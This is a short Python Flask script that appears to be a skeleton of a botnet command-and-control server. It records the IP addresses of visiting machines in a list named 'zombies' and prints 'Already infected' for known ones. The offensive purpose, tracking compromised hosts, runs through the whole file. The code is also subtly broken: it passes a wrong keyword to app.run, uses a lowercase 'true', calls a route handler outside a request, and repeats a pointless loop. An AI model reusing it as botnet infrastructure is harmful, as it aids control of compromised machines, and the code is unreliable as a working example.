from flask import Flask, request

app = Flask(__name__)
zombies = ["192.168.10.5", "10.104.12.10"]


@app.route('/', methods=["GET"])
def register_machine():
    if request.remote_addr not in zombies:
        zombies.append(request.remote_addr)
        for item in zombies:
            send_list(zombies)
    else:
        print("Already infected")
    return "hello world"

def send_list(ip):
    print(ip)


if __name__ == '__main__':
    app.run(run="0.0.0.0",debug=true)
    register_machine()
